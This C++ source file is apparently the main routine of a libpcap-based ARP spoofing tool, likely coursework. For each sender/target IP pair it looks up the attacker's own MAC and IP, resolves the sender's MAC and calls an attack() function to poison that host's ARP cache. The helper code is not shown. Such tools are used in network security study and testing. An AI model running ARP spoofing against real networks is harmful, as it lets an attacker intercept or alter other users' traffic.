#include "my-func.h"

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    // get attacker info    
    Mac mymac;
    Ip myip;
    get_myinfo(dev, mymac, myip);

    int cnt = 0;
    for (int i=2;i<argc;i+=2){
        printf("\n======Pair %d======\n", ++cnt);
        // get sender MAC
        Ip sip(argv[i]);
        Mac smac;
        get_smac(handle, smac, sip, myip, mymac);

        // spoof
        Ip tip(argv[i+1]);
        Mac tmac;
        attack(handle, mymac, tip, smac, sip);
    }
    pcap_close(handle);
    return 0;
}
